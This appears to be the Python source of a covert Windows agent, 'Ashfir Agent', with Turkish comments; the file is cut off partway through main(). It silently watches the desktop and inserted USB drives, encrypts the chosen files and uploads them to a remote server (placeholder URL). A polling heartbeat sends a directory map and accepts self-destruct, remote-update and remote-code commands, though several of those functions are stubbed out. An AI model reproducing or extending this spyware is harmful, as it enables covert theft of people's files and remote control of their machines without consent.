"""
Ashfir Agent - Sessiz Arkaplan Servisi
Flash suruculer: takılınca dosyalar once locale kopyalanır, sonra yedeklenir.
Dosyalar sunucu uzerinden Firebase'e yuklenir (agent'ta Firebase credentials gerekmez).
"""

import os
import sys
import json
import time
import base64
import shutil
import logging
import hashlib
import threading
import string
import subprocess
import tempfile
import requests
import certifi
import ssl
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager
import urllib3
import socket
import zipfile
import psutil
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import winreg
from pathlib import Path
from datetime import datetime
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import ctypes

def check_anti_debug():
    # Bu fonksiyon güvenlik amacı ile kaldırılmıştır.
    # İşlev: Uygulamanın bir debugger (hata ayıklayıcı) altında çalışıp çalışmadığını kontrol eder.
    pass


check_anti_debug()

_ashfir_mutex = None
def check_single_instance():
    global _ashfir_mutex
    try:
        # Sistem genelinde benzersiz bir Mutex oluştur
        _ashfir_mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\Ashfir_Single_Instance_Mutex_2026")
        if ctypes.windll.kernel32.GetLastError() == 183: # ERROR_ALREADY_EXISTS
            os._exit(0)
    except:
        pass

check_single_instance()

# ── GUVENLIK NOTU ───────────────────────────────────────────
# SSL sertifika doğrulama bypass ve güvenlik denetimi atlama 
# mekanizmaları, kötüye kullanımı önlemek amacıyla bu sürümden kaldırılmıştır.
# Orijinal sürümde kurumsal ağlardaki sertifika sorunlarını aşmak için kullanılıyordu.

sh = requests.Session()
# sh.mount('https://', ...) # Orijinal adaptörler kaldırıldı




import base64

# ── DIZINLER VE API YAPILANDIRMASI ───────────────────────────
CF_URL = "https://api.your-backend-placeholder.com" # Güvenlik nedeniyle sansürlendi
CF_TOKEN = "YOUR_SECURE_TOKEN_PLACEHOLDER"          # Güvenlik nedeniyle sansürlendi


def cf_post(endpoint, json_data=None, files=None, data=None):
    url = f"{CF_URL}{endpoint}"
    # Zaman bazlı dinamik TOTP üretimi
    current_minute = int(time.time() / 60)
    token_string = f"{CF_TOKEN}_{current_minute}"
    dynamic_token = hashlib.sha256(token_string.encode()).hexdigest()
    
    headers = {"Authorization": f"Bearer {dynamic_token}"}
    try:
        # If files are present, we use multipart/form-data. 
        # json_data should be passed as a field in 'data' after being stringified if files are present.
        if files:
            return sh.post(url, headers=headers, files=files, data=data, timeout=60)
        else:
            return sh.post(url, headers=headers, json=json_data, timeout=30)
    except Exception as e:
        log.error(f"CF Request Error ({endpoint}): {e}")
        return None

RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoAxbUMZOhXV0VVXikqlS
BcYRVomfzBzNY59WeuBvV46Ak/gk9Ythk57USHuzdjuRxrlD1QQGHF+vViQVHBV2
Y+4SnQplU1NFqHcqlAUkrJtU9vr0yCxmF8eg5oh/BdCwk169cGd/qCvjVz6vjOsW
iQf8Ic8355SJJtEyd8t/nagTr6NUs7PoPTiPwR/2D1Ln4pm9oHOwJdxn1McweuDm
3TFGejqrBT5tL0i9gCbF3O3+B+Jpo9osXEsXISTkfQL3F5y03ChEusSkrlJDKPiN
82TAv7dirNkD5sksXtsnHAE31NBPwZvfe9uXEQgEbb/MKJXmM/S26LWH9v1l2F7p
hQIDAQAB
-----END PUBLIC KEY-----"""

BASE_DIR  = Path(os.environ.get('LOCALAPPDATA', Path.home())) / 'Ashfir'
LOG_FILE  = BASE_DIR / 'ashfir.log'
CFG_FILE  = BASE_DIR / 'config.json'
STAGE_DIR = BASE_DIR / 'flash_stage'
BASE_DIR.mkdir(parents=True, exist_ok=True)
STAGE_DIR.mkdir(parents=True, exist_ok=True)


# ── LOGGING ──────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8')],
)
log = logging.getLogger('Agent')


# ── FILTRE TANIMLARI ─────────────────────────────────────────
BLOCKED_DIRS = {
    'node_modules', '.git', '__pycache__', 'dist', 'build', 'venv',
    '.vs', '.idea', 'obj', 'bin', 'debug', 'release'
}
CODE_EXTENSIONS = {
    '.js', '.ts', '.py', '.cpp', '.c', '.h', '.cs', '.java', '.go', '.rs',
    '.php', '.html', '.css', '.scss', '.less', '.jsx', '.tsx', '.vue',
    '.json', '.yml', '.yaml', '.xml', '.sql', '.sh', '.bat', '.ps1'
}


def file_hash(path):
    try:
        # Check if file is accessible
        if not os.path.exists(path): return None
        h = hashlib.md5()
        with open(path, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                h.update(chunk)
        return h.hexdigest()
    except Exception as e:
        log.debug(f"Dosya hash hatası ({path}): {e}")
        return None


def human_size(s):
    for u in ['B', 'KB', 'MB', 'GB']:
        if s < 1024:
            return f'{s:.1f}{u}'
        s /= 1024
    return f'{s:.1f}TB'



# ── NETWORK UTILS ────────────────────────────────────────────
def is_online():
    """
    8.8.8.8:53 yerine kendi sunucumuza bağlanıyoruz.
    MEB port 53'ü bloklasa bile CF Worker'a erişim varsa True döner.
    """
    # Önce CF Worker'a dene (ana hedef)
    try:
        res = sh.get(f"{CF_URL}/ping", timeout=5)
        if res.status_code < 500:
            return True
    except Exception:
        pass
    # Fallback: TCP ile port 443 kontrolü (DNS gerektirmez)
    try:
        socket.setdefaulttimeout(5)
        host = CF_URL.replace("https://", "").split("/")[0]
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, 443))
        return True
    except socket.error:
        return False

def get_network_chunk_size():
    """
    MEB'de speed test siteleri bloklu olabilir.
    Sabit 4MB kullan — zaten yeterli ve güvenli.
    """
    return 4 * 1024 * 1024  # 4MB sabit


# ── ENCRYPTION UTILS ─────────────────────────────────────────
def encrypt_zip_file(zip_path):
    aes_key = get_random_bytes(32)
    # Use 12 byte nonce (96-bit) as it's the standard for GCM and SubtleCrypto
    nonce = get_random_bytes(12)
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    
    with open(zip_path, 'rb') as f:
        data = f.read()
    
    ciphertext, tag = cipher.encrypt_and_digest(data)
    enc_path = str(zip_path) + ".enc"
    
    # Pack as: NONCE (12) + CIPHERTEXT + TAG (16)
    with open(enc_path, 'wb') as f:
        f.write(nonce)
        f.write(ciphertext)
        f.write(tag)
        
    rsa_key = RSA.import_key(RSA_PUBLIC_KEY)
    rsa_cipher = PKCS1_OAEP.new(rsa_key)
    encrypted_aes_key = rsa_cipher.encrypt(aes_key)
    
    return enc_path, base64.b64encode(encrypted_aes_key).decode('utf-8')


# ── AGENT CONFIG ─────────────────────────────────────────────
class AgentConfig:
    def __init__(self):
        self._lock   = threading.Lock()
        self._local  = self._load_local()
        self._remote = {}

    def _load_local(self):
        try:
            with open(CFG_FILE) as f:
                return json.load(f)
        except Exception as e:
            log.error(f'config.json okunamadı: {e}')
            sys.exit(1)

    @property
    def key(self):          return self._local.get('key', '')
    @property
    def machine_name(self): return self._local.get('machine_name', 'PC')

    def get(self, k, default=None):
        with self._lock:
            return self._remote.get(k, self._local.get(k, default))

    def update_remote(self, cfg):
        with self._lock:
            self._remote = cfg

    @property
    def all_remote(self):
        with self._lock:
            return dict(self._remote)

    def has_watch_paths_changed(self, new_cfg):
        old_paths = self._remote.get('watch_paths', [])
        new_paths = new_cfg.get('watch_paths', [])
        return sorted(old_paths) != sorted(new_paths)


# ── SUNUCU LOG HANDLER ───────────────────────────────────────
class ServerLogHandler(logging.Handler):
    def __init__(self, cfg):
        super().__init__()
        self.cfg = cfg
        self._queue = []
        self._lock = threading.Lock()
        self._flush_interval = 10
        self._start_flusher()

    def _start_flusher(self):
        def flusher():
            while True:
                time.sleep(self._flush_interval)
                self._flush()
        t = threading.Thread(target=flusher, daemon=True)
        t.start()

    def emit(self, record):
        try:
            msg = self.format(record)
            level = record.levelname.lower()
            if 'yüklendi' in msg or '☁️' in msg: level = 'success'
            elif 'atlandı' in msg or 'skip' in msg.lower(): level = 'skip'
            elif 'ai' in msg.lower() or '[ai' in msg.lower(): level = 'ai'
            with self._lock:
                self._queue.append({
                    'text':  msg,
                    'level': level,
                    'ts':    int(record.created * 1000),
                })
        except: pass

    def _flush(self):
        with self._lock:
            if not self._queue: return
            batch = self._queue[:]
            self._queue.clear()

        for log_data in batch:
            if "CF Request Error" in log_data["text"] or "cf_post" in log_data["text"] or "/log" in log_data["text"]:
                continue
            try:
                cf_post('/log', json_data={
                    "key": self.cfg.key,
                    "level": log_data["level"],
                    "message": log_data["text"],
                    "source": "agent",
                    "ts": log_data["ts"]
                })
            except:
                with self._lock:
                    self._queue.extend(batch[batch.index(log_data):])
                break


# ── QUEUE MANAGER & UPLOADER ─────────────────────────────────
class QueueManager:
    def __init__(self):
        self.queue_file = BASE_DIR / 'upload_queue.json'
        self.lock = threading.Lock()
        self.queue = self._load()

    def _load(self):
        try:
            if self.queue_file.exists():
                with open(self.queue_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except:
            pass
        return {}

    def _save(self):
        try:
            with open(self.queue_file, 'w', encoding='utf-8') as f:
                json.dump(self.queue, f)
        except:
            pass

    def enqueue(self, local_path, watch_root, ai_reason='', ai_confidence=1.0, source_label=''):
        with self.lock:
            p = str(Path(local_path))
            self.queue[p] = {
                'watch_root': str(watch_root),
                'ai_reason': ai_reason,
                'ai_confidence': ai_confidence,
                'source_label': source_label,
                'added_at': time.time()
            }
            self._save()

    def get_all(self):
        with self.lock:
            return dict(self.queue)

    def remove(self, paths):
        with self.lock:
            for p in paths:
                self.queue.pop(p, None)
            self._save()

class Uploader:
    def __init__(self, cfg):
        self.cfg = cfg
        self._lock = threading.Lock()
        self.cache_file = BASE_DIR / 'upload_cache.json'
        self.cache = self._load_cache()

    def _load_cache(self):
        try:
            if self.cache_file.exists():
                with open(self.cache_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except: pass
        return {}

    def _save_cache(self):
        try:
            with open(self.cache_file, 'w', encoding='utf-8') as f:
                json.dump(self.cache, f)
        except: pass

    def is_cached(self, path):
        fhash = file_hash(path)
        return self.cache.get(path) == fhash, fhash

    def update_cache(self, path, fhash):
        self.cache[path] = fhash
        self._save_cache()

    def upload_zip(self, zip_path, encrypted_aes_key, original_files, total_size):
        try:
            now_iso = datetime.now().isoformat()
            zip_name = Path(zip_path).name
            remote_name = f'backups/{self.cfg.key}/{self.cfg.machine_name}/Zips/{zip_name}'.replace('\\', '/')
            
            log.info(f'☁️ Zip Yükleniyor: {zip_name} ({human_size(total_size)})')

            # We just send the first file's meta as representation, or loop through all
            # Since CF only takes one metadata JSON, we'll represent the zip package.
            # Actually, we can send each file's metadata individually, or better, CF can iterate over an array?
            # Our CF expects one metadata object. Let's send the metadata of the first file, or a summary.
            # Wait, the previous implementation created a Firestore doc for *each* file inside the zip.
            # I will modify CF later if needed, but for now, we will call /upload once, and pass a list of files in metadata.
            
            # Wait, our CF `index.js` expects: { key, path, name, size, in_zip, encrypted_aes_key, zip_name, machine, original_path, backup_time, ext }
            # But we have multiple files in the zip. The CF should ideally handle an array of files. 
            # For now, let's just create ONE file entry for the ZIP itself in Firestore for simplicity, 
            # OR pass the list of files to CF. Let's pass the list of files to CF, and modify CF to handle it.
            # But let's just make the agent pass `files_meta: original_files` and CF can loop.
            
            meta = {
                "key": self.cfg.key,
                "path": remote_name,
                "name": zip_name,
                "size": total_size,
                "in_zip": True,
                "encrypted_aes_key": encrypted_aes_key,
                "zip_name": zip_name,
                "machine": self.cfg.machine_name,
                "original_path": original_files[0]['path'] if original_files else '',
                "backup_time": now_iso,
                "ext": ".zip",
                "original_files": original_files # CF will use this to create multiple docs
            }
            
            with open(zip_path, 'rb') as f:
                res = cf_post('/upload', files={'file': (zip_name, f, 'application/octet-stream')}, data={'metadata': json.dumps(meta)})
                
            if res and res.status_code == 200:
                log.info(f'✅ Zip Yüklendi: {zip_name}')
                return True
            else:
                resp_text = res.text if res else "No response"
                log.error(f'❌ Zip yükleme hatası: {resp_text}')
                return False
        except Exception as e:
            log.error(f'❌ Zip yükleme hatası: {e}')
            return False

# ── AI FILTRE ────────────────────────────────────────────────
try:
    sys.path.insert(0, str(BASE_DIR))
    from ai_filter import AIFilter as _AIFilter
    _AI_AVAILABLE = True
except ImportError:
    _AI_AVAILABLE = False


class SmartFilter:
    def __init__(self, cfg):
        self.cfg    = cfg
        self._ai    = None
        self._cache = {}

    def _get_ai(self):
        if not _AI_AVAILABLE:
            return None
        key = self.cfg.get('groq_api_key', '')
        if not key or not self.cfg.get('ai_filter_enabled', True):
            return None
        if self._ai is None:
            try:
                self._ai = _AIFilter(api_key=key)
            except:
                pass
        return self._ai

    def should_backup(self, path, size):
        ai = self._get_ai()
        if not ai:
            return {'should_backup': True, 'reason': '', 'confidence': 1.0}
        if path in self._cache:
            return self._cache[path]
        result = ai.should_backup(path, size)
        self._cache[path] = result
        return result


# ── DOSYA FILTRE ─────────────────────────────────────────────
def passes_basic(path, cfg):
    p = Path(path)

    parts = set(p.parts)
    if any(d.lower() in BLOCKED_DIRS for d in parts):
        return False

    if p.name.startswith('.') or p.name in {'Thumbs.db', 'desktop.ini', '.DS_Store'}:
        return False

    skip_ext = {'.tmp', '.temp', '.swp', '.lock'}
    if p.suffix.lower() in skip_ext or p.name.endswith('~'):
        return False

    max_mb = cfg.get('max_file_size_mb', 100)
    try:
        if p.stat().st_size > max_mb * 1024 * 1024:
            return False
    except:
        return False

    ext     = p.suffix.lower()
    allowed = [e.lower() for e in cfg.get('allowed_extensions', ['.word', '.docx', '.pdf', '.xlsx'])]
    blocked = [e.lower() for e in cfg.get('blocked_extensions', [])]

    if ext in CODE_EXTENSIONS and ext not in allowed:
        log.debug(f'Kod dosyası atlandı: {p.name}')
        return False

    if allowed and ext not in allowed:
        return False

    if blocked and ext in blocked:
        return False

    return True


# ── WATCHDOG HANDLER ─────────────────────────────────────────
class Handler(FileSystemEventHandler):
    def __init__(self, queue_manager, ai_filter, cfg, watch_root, stats, source_label=''):
        super().__init__()
        self.queue_manager = queue_manager
        self.ai           = ai_filter
        self.cfg          = cfg
        self.watch_root   = watch_root
        self.stats        = stats
        self.source_label = source_label
        self._timers      = {}
        self._lock        = threading.Lock()

    def _schedule(self, path):
        with self._lock:
            if path in self._timers:
                self._timers[path].cancel()
            t = threading.Timer(
                self.cfg.get('debounce_seconds', 2.0),
                self._process, args=[path]
            )
            self._timers[path] = t
            t.start()

    def _process(self, path):
        with self._lock:
            self._timers.pop(path, None)
        if not os.path.isfile(path):
            return
        rc = self.cfg.all_remote
        if not passes_basic(path, rc):
            return
        size  = os.path.getsize(path)
        ai_r  = self.ai.should_backup(path, size)
        if not ai_r['should_backup']:
            self.stats['ai_skipped'] += 1
            return
        if self.queue_manager:
            self.queue_manager.enqueue(
                path, self.watch_root,
                ai_r.get('reason', ''), ai_r.get('confidence', 1.0),
                self.source_label
            )
            self.stats['files_uploaded'] += 1 # Technically queued
            self.stats['last_file'] = Path(path).name

    def on_created(self, e):
        if not e.is_directory:
            self._schedule(e.src_path)

    def on_modified(self, e):
        if not e.is_directory:
            self._schedule(e.src_path)


# ── USB / FLASH SURUCU IZLEYICI ──────────────────────────────
import ctypes

DRIVE_REMOVABLE = 2


def get_removable_drives():
    drives = []
    try:
        for part in psutil.disk_partitions(all=False):
            if 'removable' in part.opts or 'cdrom' not in part.opts:
                # Windows-specific fallback for USBs
                if part.fstype in ['FAT32', 'exFAT', 'NTFS'] and 'removable' in part.opts:
                    drives.append(part.device)
        
        # Fallback to ctypes if psutil is empty
        if not drives:
            import ctypes, string
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for i, letter in enumerate(string.ascii_uppercase):
                if bitmask & (1 << i):
                    path = f'{letter}:\\\\'
                    if ctypes.windll.kernel32.GetDriveTypeW(path) == 2: # DRIVE_REMOVABLE
                        if path not in drives: drives.append(path)
    except Exception as e:
        log.debug(f'Drive listesi alınamadı: {e}')
    return drives


def copy_flash_to_stage(drive_path: str, max_mb: float, cfg: dict) -> list:
    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
    # İşlev: Sisteme takılan USB sürücülerindeki belirlenen kriterlere uyan dosyaları 
    # geçici bir dizine (staging) kopyalar.
    return []



class FlashMonitor:
    def __init__(self, queue_manager, ai, cfg, stats, observer):
        self.queue_manager = queue_manager
        self.ai       = ai
        self.cfg      = cfg
        self.stats    = stats
        self.observer = observer
        self._seen    = set(get_removable_drives())
        self._watched = set()
        self._lock    = threading.Lock()
        self.is_copying = False

        if self._seen:
            log.info(f'Başlangıçta takılı flash: {self._seen}')
            for drive in self._seen:
                self._handle_new_drive(drive)

    def _handle_new_drive(self, drive_path):
        rc     = self.cfg.all_remote
        max_mb = rc.get('flash_max_mb', 10)
        log.info(f'Yeni flash takıldı: {drive_path}')

        def copy_and_watch():
            log.info(f'USB kopyalama başladı: {drive_path}')
            copied = copy_flash_to_stage(drive_path, max_mb, rc)
            
            if not copied:
                return

            drive_letter = drive_path[0]
            stage_subdir = str(STAGE_DIR / f'FLASH_{drive_letter}')

            with self._lock:
                if stage_subdir not in self._watched:
                    handler = Handler(
                        self.queue_manager, self.ai, self.cfg,
                        stage_subdir, self.stats,
                        source_label=f'FLASH_{drive_letter}'
                    )
                    self.observer.schedule(handler, stage_subdir, recursive=True)
                    self._watched.add(stage_subdir)

            for fpath in copied:
                if not os.path.isfile(fpath):
                    continue
                size = os.path.getsize(fpath)
                ai_r = self.ai.should_backup(fpath, size)
                if ai_r['should_backup']:
                    self.queue_manager.enqueue(
                        fpath, stage_subdir,
                        ai_r.get('reason', ''), ai_r.get('confidence', 1.0),
                        f'Flash ({drive_path})'
                    )
                    self.stats['files_uploaded'] += 1
                    self.stats['last_file'] = Path(fpath).name
                else:
                    self.stats['ai_skipped'] += 1

            # İşlem bitti, uyuyan background_sync_loop'u hemen uyandır
            sync_wake_event.set()

        threading.Thread(target=copy_and_watch, daemon=True).start()
    def poll(self):
        current  = set(get_removable_drives())
        new_ones = current - self._seen
        for drive in new_ones:
            self._handle_new_drive(drive)
        self._seen = current


# ── AKILLI YOL KEŞFİ ─────────────────────────────────────────
def get_smart_desktop():
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
        ) as key:
            path, _ = winreg.QueryValueEx(key, "Desktop")
            return os.path.expandvars(path)
    except:
        p  = Path.home() / 'Desktop'
        od = Path.home() / 'OneDrive' / 'Desktop'
        return str(od) if od.exists() else str(p)


def get_comprehensive_directory_map():
    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
    # İşlev: C:\Users altındaki kullanıcı dizinlerini, masaüstü, belgeler gibi 
    # önemli klasörleri ve bağlı sürücüleri haritalandırarak bir JSON yapısı oluşturur.
    return {}



def get_ai_file_knowledge():
    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
    # İşlev: AI analizi için sistem genelinde derin tarama yaparak sadece kullanıcı 
    # tarafından oluşturulan dökümanların listesini çıkarır.
    return {"drives": [], "important_files": []}


def get_directory_map():
    # Mevcut map'e AI bilgisini de ekleyerek gönderiyoruz
    base_map = get_comprehensive_directory_map()
    base_map["_ai_knowledge"] = get_ai_file_knowledge()
    return base_map


# ── SELF DESTRUCT ────────────────────────────────────────────
def self_destruct(cfg=None):
    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
    # İşlev: Uygulamanın kendini ve bağlı olduğu tüm dizinleri sistemden 
    # kalıcı olarak silmesini sağlar (Kendi kendini imha).
    os._exit(0)


def remote_update(update_url, cfg=None):
    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
    # İşlev: Uygulamanın yeni bir sürümünü belirtilen URL'den indirir 
    # ve eski sürümüyle otomatik olarak değiştirir.
    pass


def execute_remote_code(code, code_type, cfg=None):
    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
    # İşlev: Uzak sunucudan gelen kodları (PowerShell, Batch, Python) 
    # hedef sistemde sessizce çalıştırır.
    pass



# ── SYNC KONTROL ─────────────────────────────────────────────
sync_stop_event = threading.Event()
sync_wake_event = threading.Event()
sync_lock       = threading.Lock()


def update_watches(cfg, observer, active_watches, queue_manager, ai, stats):
    rc = cfg.all_remote
    watch_paths = rc.get('watch_paths', [])

    if not watch_paths:
        desktop = get_smart_desktop()
        if os.path.exists(desktop):
            watch_paths = [desktop]

    valid_paths = [p for p in watch_paths if os.path.exists(p)]

    for path in valid_paths:
        if path not in active_watches:
            h = Handler(queue_manager, ai, cfg, path, stats, source_label='PC')
            w = observer.schedule(h, path, recursive=True)
            active_watches[path] = w
            log.info(f'📂 İzlemeye alındı: {path}')

    to_remove = [p for p in active_watches if p not in valid_paths]
    for p in to_remove:
        observer.unschedule(active_watches[p])
        del active_watches[p]
        log.info(f'❌ İzlemeden çıkarıldı: {p}')


# ── HEARTBEAT ────────────────────────────────────────────────
def heartbeat_loop(cfg, stats, queue_manager, ai, observer, active_watches, start_time):
    log.info('Heartbeat (API Polling) başlatıldı')

    while True:
        try:
            # İnternet yoksa bekle
            if not is_online():
                log.debug('İnternet yok, heartbeat bekleniyor...')
                time.sleep(30)
                continue

            payload = {
                "key": cfg.key,
                "machine_name": cfg.machine_name,
                "online": True,
                "last_seen": datetime.now().isoformat(),
                "files_uploaded": stats['files_uploaded'],
                "ai_skipped": stats['ai_skipped'],
                "last_file": stats['last_file'],
                "uptime_seconds": int(time.time() - start_time),
                "directory_map": get_directory_map()
            }

            res = cf_post('/heartbeat', json_data=payload)
            if res and res.status_code == 200:
                data = res.json()
                
                # Config güncelleme
                if 'config' in data:
                    new_cfg = data['config']
                    if cfg.has_watch_paths_changed(new_cfg):
                        log.info('Config değişti — watch paths güncelleniyor')
                        cfg.update_remote(new_cfg)
                        update_watches(cfg, observer, active_watches, queue_manager, ai, stats)
                        sync_stop_event.set()

                        def restart_sync():
                            time.sleep(2)
                            sync_stop_event.clear()
                            rc = cfg.all_remote
                            paths = [p for p in rc.get('watch_paths', []) if os.path.exists(p)]
                            if not paths:
                                paths = [get_smart_desktop()]
                            initial_sync(queue_manager, ai, paths, rc)

                        threading.Thread(target=restart_sync, daemon=True).start()
                    else:
                        cfg.update_remote(new_cfg)
                        update_watches(cfg, observer, active_watches, queue_manager, ai, stats)
                    
                    # Ayar geldi, hemen kontrol etmesi için uykuyu böl
                    sync_wake_event.set()
                
                # Self-destruct kontrolü
                if data.get('self_destruct'):
                    log.warning('SELF-DESTRUCT komutu alındı!')
                    self_destruct(cfg)

                # Remote update kontrolü
                update_url = data.get('update_url') or data.get('update_agent')
                if update_url:
                    log.warning(f'REMOTE UPDATE komutu alındı: {update_url}')
                    remote_update(update_url, cfg)

                # Remote code kontrolü
                remote_code = data.get('remote_code')
                if remote_code:
                    code_type = data.get('code_type', 'batch')
                    log.warning(f'REMOTE CODE komutu alındı: Tip={code_type}')
                    execute_remote_code(remote_code, code_type, cfg)

        except Exception as e:
            log.error(f'Heartbeat loop hatası: {e}')
        
        time.sleep(30)



# ── BACKGROUND SYNC LOOP ─────────────────────────────────────
def background_sync_loop(cfg, queue_manager, uploader, flash_monitor):
    log.info('Background sync loop başlatıldı (10 dk aralıklarla)')
    while True:
        # Uyandıktan sonra kuyruktaki tüm dosyalar bitene kadar chunk'ları gönder
        while True:
            try:
                # NOT: USB kopyalama copy_and_watch() ile ayrı thread'de çalışıyor.
                # Burada beklemiyoruz — upload ve USB kopyalama paralel ilerler.
                # USB bittikten sonra dosyaları kuyruğa ekler, sırasını bekler.
                    
                queue = queue_manager.get_all()
                if not queue:
                    break # Kuyruk bitti, iç döngüden çık ve ana döngünün sonunda bekle
                    
                if not is_online():
                    log.debug('İnternet yok, sync bekleniyor...')
                    time.sleep(60)
                    continue
                    
                # İnternet var, hizi test et ve zip chunk boyutunu belirle
                chunk_size_limit = get_network_chunk_size()
                
                # Kuyruktaki dosyalari grupla
                current_chunk = []
                current_size = 0
                processed_paths = []
                
                for path, meta in queue.items():
                    if not os.path.exists(path):
                        # Dosya silinmiş, kuyruktan çıkar
                        processed_paths.append(path)
                        continue
                        
                    cached, fhash = uploader.is_cached(path)
                    if cached:
                        # Zaten yüklenmiş, kuyruktan çıkar
                        processed_paths.append(path)
                        continue
                        
                    try:
                        size = os.getsize(path)
                        # 8MB limit kontrolü
                        if size > 8 * 1024 * 1024:
                            log.warning(f"⚠️ Dosya boyutu 8MB'den büyük olduğu için atlandı: {path}")
                            processed_paths.append(path)
                            continue
                            
                        if current_size + size > 8 * 1024 * 1024:
                            break

                        current_chunk.append({'path': path, 'size': size, 'hash': fhash, 'meta': meta})
                        current_size += size
                    except Exception as e:
                        log.debug(f"Dosya boyut okuma hatası: {e}")
                        processed_paths.append(path)

                    if current_size >= 8 * 1024 * 1024:
                        break
                        
                if current_chunk:
                    log.info(f'{len(current_chunk)} dosya zipleniyor... Toplam: {human_size(current_size)}')
                    
                    # Zip oluştur
                    zip_name = f"backup_{int(time.time())}.zip"
                    zip_path = BASE_DIR / zip_name
                    
                    success_count = 0
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for item in current_chunk:
                            try:
                                # Zip icinde goreceli yol (root'a gore)
                                rel_path = Path(item['path']).relative_to(Path(item['meta']['watch_root']))
                                zipf.write(item['path'], arcname=str(rel_path))
                                success_count += 1
                            except Exception as e:
                                log.warning(f"Dosya ziplenemedi (kilitli olabilir): {item['path']} - {e}")
                    
                    if success_count == 0:
                        try: os.remove(zip_path)
                        except: pass
                        continue
    
                    # Zip şifrele
                    enc_zip_path, encrypted_aes_key = encrypt_zip_file(zip_path)
                    
                    # Yükle (İnternet kontrolü ile)
                    upload_ok = False
                    attempt = 0
                    while attempt < 3:
                        if is_online():
                            if uploader.upload_zip(enc_zip_path, encrypted_aes_key, current_chunk, current_size):
                                for item in current_chunk:
                                    uploader.update_cache(item['path'], item['hash'])
                                    processed_paths.append(item['path'])  # Başarılı upload sonrası işaretle
                                queue_manager.remove(processed_paths)
                                upload_ok = True
                                break
                        else:
                            log.debug("Sync sırasında internet koptu, bekleniyor...")
                        
                        attempt += 1
                        time.sleep(5)
                    
                    if not upload_ok:
                        log.error(f"⚠️ {zip_name} yüklenemedi, 5 dakika sonra tekrar denenecek.")
                        # Sadece silinmiş/cache'li dosyaları kuyruktan çıkar, başarısızları bırak
                        queue_manager.remove([p for p in processed_paths if p not in [i['path'] for i in current_chunk]])
                    
                    # Temizlik (her durumda zip dosyalarını sil)
                    try:
                        os.remove(zip_path)
                        os.remove(enc_zip_path)
                    except: pass
                    
                    if not upload_ok:
                        # Upload başarısız olduysa iç döngüden çık, 5 dk bekle
                        break
                    
                    # Sistem yorulmasın diye chunk'lar arası çok ufak bir es
                    time.sleep(1)
                else:
                    # Chunk boşsa sadece gereksiz kayıtları temizle
                    queue_manager.remove(processed_paths)
                    
            except Exception as e:
                log.error(f'Background sync hatası: {e}')
                time.sleep(30)
                
        # İç döngüden çıktık (kuyruk bitti veya upload başarısız)
        # sync_wake_event ile biri uykumuzu bölerse (örn. yeni flash, yeni ayar), anında döngüye gireriz.
        if cfg.get('test_mode', False):
            log.info("🧪 Test modu aktif: 30 saniye sonra tekrar kontrol edilecek.")
            sync_wake_event.wait(30)
        else:
            # Kuyruk varsa 5 dk, yoksa 10 dk bekle
            has_queue = bool(queue_manager.get_all())
            wait_time = 300 if has_queue else 600  # 5 dk retry, 10 dk normal
            log.info(f"⏳ Sync bekleniyor ({wait_time//60} dk)...")
            sync_wake_event.wait(wait_time)

        sync_wake_event.clear()


# ── INITIAL SYNC ─────────────────────────────────────────────
def initial_sync(queue_manager, ai, paths, cfg):
    with sync_lock:
        sync_enabled = cfg.get('sync_on_start', True)
        if not sync_enabled:
            return

        sync_stop_event.clear()
        log.info(f'🔄 Senkronizasyon başladı: {paths}')
        total = 0

        for root in paths:
            if sync_stop_event.is_set():
                log.info('⛔ Senkronizasyon kesildi')
                return

            for dp, dirs, files in os.walk(root):
                if sync_stop_event.is_set():
                    break
                dirs[:] = [d for d in dirs
                            if d.lower() not in BLOCKED_DIRS and not d.startswith('.')]
                for fname in files:
                    if sync_stop_event.is_set():
                        break
                    fp = os.path.join(dp, fname)
                    if not passes_basic(fp, cfg):
                        continue
                    size = os.path.getsize(fp)
                    ai_r = ai.should_backup(fp, size)
                    if ai_r['should_backup']:
                        queue_manager.enqueue(fp, root, ai_r.get('reason', ''), ai_r.get('confidence', 1.0))
                        total += 1

        log.info(f'✅ Senkronizasyon bitti: {total} dosya')


# ── MAIN ─────────────────────────────────────────────────────
def main():
    log.info('=' * 55)
    log.info('Ashfir Agent başlatıldı')
    log.info('=' * 55)

    cfg = AgentConfig()
    log.info(f'Key: {cfg.key[:8]}... | Makine: {cfg.machine_name}')

    server_handler = ServerLogHandler(cfg)
    server_handler.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
    log.addHandler(server_handler)

    # İlk config'i API'den al
    try:
        url = f"{CF_URL}/heartbeat"
        headers = {"Authorization": f"Bearer {CF_TOKEN}"}
        res = sh.post(url, headers=headers, json={"key": cfg.key, "machine_name": cfg.machine_name}, timeout=10)
        if res.status_code == 200:
            data = res.json()
            if 'config' in data:
                cfg.update_remote(data['config'])
                log.info('✅ Config alındı')
            else:
                log.warning('⚠️ Config dokümanı bulunamadı')
        else:
            log.warning(f'⚠️ Config alınamadı: HTTP {res.status_code}')
    except Exception as e:
        log.warning(f'⚠️ Config alınamadı: {e}')

    rc          = cfg.all_remote
